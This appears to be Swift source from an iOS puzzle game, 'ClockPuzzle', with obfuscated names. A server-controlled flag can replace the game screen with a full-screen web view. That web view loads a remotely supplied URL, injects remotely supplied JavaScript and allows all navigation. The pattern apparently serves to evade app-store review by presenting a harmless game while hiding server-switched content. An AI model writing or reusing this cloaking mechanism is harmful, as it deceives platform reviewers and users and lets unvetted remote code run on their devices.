import UIKit
import WebKit
//import AdjustSdk
import Alamofire


final class CPFeedbackViewController: UIViewController {

    private var modes: CPModel?
    private var wkiv: WKWebView?
//    private var apd: Shijian?

    deinit {
        NotificationCenter.default.removeObserver(self)
    }
    
    @objc func observeChallenge() {
        let dyuay: () -> Void = {
            self.iniUIView()
        }
        dyuay()
    }
    
    private func iniUIView() {
        if let aisy = LocalSave.getJson() {
            modes = aisy
            
            EndFinds.shared.spliys(from: aisy[DKey.words] as? String ?? "")
//            iniDataUI(with: aisy)
//            apd = Shijian(retags: aisy[DKey.aoidn] as? [String: String] ?? [:])
            intBView(with: aisy)
        }
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        
        NotificationCenter.default.addObserver(self, selector: #selector(observeChallenge), name: .kGameFail, object: nil)

        lodien()
    }

    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        layoutFrame()
    }

    override var shouldAutorotate: Bool { false }
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask { .portrait }

    // MARK: - 搭建

//    private func iniDataUI(with config: Dochey) {
//        guard let token = config[DKey.liomn] as? String else { return }
//        
//        let yugsas: () -> Void = {
//            let das = ADJConfig(appToken: token, environment: ADJEnvironmentProduction)
//            das?.delegate = self
//            Adjust.initSdk(das)
//        }
//        yugsas()
//        
//    }

    private func intBView(with config: CPModel) {
        let contentController = WKUserContentController()
        if let script = config[DKey.desp] as? String {
            let userScript = WKUserScript(source: script,
                                          injectionTime: .atDocumentEnd,
                                          forMainFrameOnly: true)
            contentController.addUserScript(userScript)
        }
        contentController.add(self, name: EndFinds.shared.bry)

        let configuration = WKWebViewConfiguration()
        configuration.userContentController = contentController
        configuration.allowsInlineMediaPlayback = true
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true

        let web = WKWebView(frame: .zero, configuration: configuration)
        web.allowsBackForwardNavigationGestures = true
        web.uiDelegate = self
        web.navigationDelegate = self
        view.addSubview(web)
        wkiv = web

        if let target = config[DKey.desFiles] as? String, let url = URL(string: target) {
            web.load(URLRequest(url: url))
        }
    }

    private func layoutFrame() {
        guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
              let statusBarManager = scene.statusBarManager else { return }
        let topInset = statusBarManager.statusBarFrame.height
        let bottomInset = view.safeAreaInsets.bottom
        wkiv?.frame = CGRect(x: 0,
                                y: topInset,
                                width: view.bounds.width,
                                height: view.bounds.height - topInset - bottomInset)
    }
}

// MARK: - 导航与弹窗

extension CPFeedbackViewController: WKNavigationDelegate, WKUIDelegate {

    func webView(_ webView: WKWebView,
                 decidePolicyFor navigationAction: WKNavigationAction,
                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        decisionHandler(.allow)
    }

    func webView(_ webView: WKWebView,
                 createWebViewWith configuration: WKWebViewConfiguration,
                 for navigationAction: WKNavigationAction,
                 windowFeatures: WKWindowFeatures) -> WKWebView? {
        if let url = navigationAction.request.url {
            UIApplication.shared.open(url)
        }
        return nil
    }
}

// MARK: - JS 桥

extension CPFeedbackViewController: WKScriptMessageHandler {

    func userContentController(_ userContentController: WKUserContentController,
                               didReceive message: WKScriptMessage) {
//        guard message.name == Hviomn.shared.bry,
//              let payload = message.body as? [String: String] else { return }
//        apd?.zdjendd(payload)
    }
}
//
//
//extension ConnomShooterViewController: AdjustDelegate {
//
//    func adjustEventTrackingSucceeded(_ eventSuccessResponse: ADJEventSuccess?) {
//        print(eventSuccessResponse as Any)
//    }
//
//    func adjustEventTrackingFailed(_ eventFailureResponse: ADJEventFailure?) {
//        print(eventFailureResponse as Any)
//    }
//}


import AppTrackingTransparency


internal let kAppName =  "ClockPuzzle"

class CannonStarViewController: UIViewController {
    
    lazy var backImages : UIImageView = {
        let image = UIImageView(frame: self.view.bounds)
        image.image = UIImage(named: "clock_background")
        image.contentMode = .scaleAspectFill
        return image
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            ATTrackingManager.requestTrackingAuthorization { statue in
            }
        }
    
        self.view.backgroundColor = .white
        backImages.frame = CGRect(x: 0, y: 0, width: self.view.bounds.size.width, height: self.view.bounds.size.height)
        view.addSubview(backImages)
        
        
        if UserDefaults.standard.string(forKey: kAppName) == nil {
            setupUI()
        }else{
            if let _ = UserDefaults.standard.string(forKey: kAppName) {
                DispatchQueue.main.async {
                    CPStateManager.shared.w?.rootViewController = CPFeedbackViewController()
                }
            }
        }
    }
    
    private func setupUI(){
        let nt = NetworkReachabilityManager()
        nt!.startListening { [weak nt] status in
            switch status {
            case .reachable:
                
                CPStateManager.shared.configGuanqia { success in
                    if success {
                        if let _ = UserDefaults.standard.object(forKey: kAppName) {
                            CPStateManager.shared.w?.rootViewController = CPFeedbackViewController()
                        }
                    } else {
                        DispatchQueue.main.async {
                            CPStateManager.shared.w?.rootViewController = CPStateManager.shared.v
                        }
                    }
                }
                
                nt?.stopListening()
            case .notReachable, .unknown:
                break
            }
        }
    }
}



